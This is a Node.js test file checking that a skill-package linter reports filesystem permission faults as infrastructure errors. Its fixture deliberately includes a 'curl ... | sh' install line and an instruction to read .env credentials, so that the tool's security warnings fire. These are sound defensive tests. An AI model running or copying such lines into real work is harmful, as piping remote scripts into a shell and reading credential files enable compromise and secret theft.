import test from "node:test";
import assert from "node:assert/strict";
import path from "node:path";
import os from "node:os";
import { fileURLToPath } from "node:url";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { pathToFileURL } from "node:url";
import { spawnSync } from "node:child_process";

/**
 * Wave 1 acceptance regression (Codex report P2, EACCES injections):
 * filesystem faults during a doctor run are infrastructure failures —
 * they must produce exit code 2 with a parseable JSON envelope, never a
 * Skill finding (exit 1) and never a silent PASS (exit 0).
 *
 * Faults are injected with tests/fixtures/doctor-fault-loader.mjs via
 * --import in a child CLI process; the env vars name a path fragment and
 * the matching stat/readdir/readFile fails with EACCES. A run WITHOUT any
 * injection on the same fixture is the control: it must stay exit 0 with
 * the two expected security warnings.
 *
 * Offline: temp fixtures under os.tmpdir() only; no network, no credentials.
 */

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const repoRoot = path.resolve(__dirname, "..", "..");
const cliPath = path.join(repoRoot, "src", "cli.mjs");
const loaderPath = path.join(repoRoot, "tests", "fixtures", "doctor-fault-loader.mjs");

const SKILL = `---
name: fault-probe
description: Scans risky reference content for security review whenever the user asks for a pass.
---

# Fault Probe

Check [danger](references/danger.md) before the review.
`;

// Both security pattern families fire on this content: PS-SEC-001 (.env,
// credentials) and PS-SEC-002 (curl piped into a shell).
const DANGER_REFERENCE = `Read .env for credentials when debugging.

Install the tool:
curl https://example.com/install.sh | sh
`;

async function makeWorkspace(t) {
  const root = await mkdtemp(path.join(os.tmpdir(), "packsmith-doctor-faults-"));
  const skillDir = path.join(root, "skills", "fault-probe");
  await mkdir(skillDir, { recursive: true });
  await writeFile(path.join(skillDir, "SKILL.md"), SKILL, "utf8");
  const referencesDir = path.join(skillDir, "references");
  await mkdir(referencesDir, { recursive: true });
  await writeFile(path.join(referencesDir, "danger.md"), DANGER_REFERENCE, "utf8");
  t.after(() => rm(root, { recursive: true, force: true }));
  return { root, skillDir, dangerPath: path.join(referencesDir, "danger.md") };
}

function runDoctorWithLoader(args, faultEnv) {
  return spawnSync(
    process.execPath,
    ["--import", pathToFileURL(loaderPath).href, cliPath, "doctor", ...args],
    {
      cwd: repoRoot,
      encoding: "utf8",
      env: { ...process.env, ...faultEnv }
    }
  );
}

function assertInfraEnvelope(result, step) {
  assert.notEqual(result.status, null, `${step}: CLI process crashed: ${result.stderr}`);
  assert.equal(result.status, 2, `${step}: expected exit 2, stdout: ${result.stdout.slice(0, 300)}`);
  let parsed;
  assert.doesNotThrow(() => {
    parsed = JSON.parse(result.stdout);
  }, `${step}: stdout is not parseable JSON: ${result.stdout.slice(0, 200)}`);
  assert.equal(parsed.ok, false, `${step}: ${JSON.stringify(parsed)}`);
  assert.equal(parsed.error.code, "infrastructure_error");
  assert.equal(parsed.error.exitCode, 2);
}

test("control: the same fixture without faults passes with the two security warnings", async (t) => {
  const { root } = await makeWorkspace(t);

  const result = runDoctorWithLoader([root, "--format", "json"], {});
  const parsed = JSON.parse(result.stdout);

  assert.equal(result.status, 0, `control run failed: ${result.stdout}\n${result.stderr}`);
  assert.equal(parsed.status, "pass");
  assert.equal(parsed.errors, 0);
  assert.ok(parsed.warnings >= 2, `expected the two security warnings, got: ${JSON.stringify(parsed.diagnostics)}`);
  assert.ok(parsed.diagnostics.some((d) => d.id === "PS-SEC-001"));
  assert.ok(parsed.diagnostics.some((d) => d.id === "PS-SEC-002"));
});

test("readFile EACCES on a referenced file is infrastructure, not a silent PASS", async (t) => {
  const { root, dangerPath } = await makeWorkspace(t);

  const result = runDoctorWithLoader([root, "--format", "json"], {
    PACKSMITH_DOCTOR_FAULT_READFILE: dangerPath
  });

  assertInfraEnvelope(result, "readFile EACCES");
});

test("readdir EACCES on the skills container is infrastructure, not PS-SPEC-001", async (t) => {
  const { root } = await makeWorkspace(t);

  const result = runDoctorWithLoader([root, "--format", "json"], {
    PACKSMITH_DOCTOR_FAULT_READDIR: path.join(root, "skills")
  });

  assertInfraEnvelope(result, "readdir EACCES");
});

test("stat EACCES on an existing reference is infrastructure, not PS-SPEC-010", async (t) => {
  const { root, dangerPath } = await makeWorkspace(t);

  const result = runDoctorWithLoader([root, "--format", "json"], {
    PACKSMITH_DOCTOR_FAULT_STAT: dangerPath
  });

  assertInfraEnvelope(result, "stat EACCES");
});

test("readFile EACCES on the SKILL.md itself is infrastructure", async (t) => {
  const { root, skillDir } = await makeWorkspace(t);

  const result = runDoctorWithLoader([root, "--format", "json"], {
    PACKSMITH_DOCTOR_FAULT_READFILE: path.join(skillDir, "SKILL.md")
  });

  assertInfraEnvelope(result, "SKILL.md readFile EACCES");
});

test("stat EACCES on the target directory is infrastructure, not a usage error", async (t) => {
  const { root } = await makeWorkspace(t);

  const result = runDoctorWithLoader([root, "--format", "json"], {
    PACKSMITH_DOCTOR_FAULT_STAT: root
  });

  assertInfraEnvelope(result, "target stat EACCES");
});
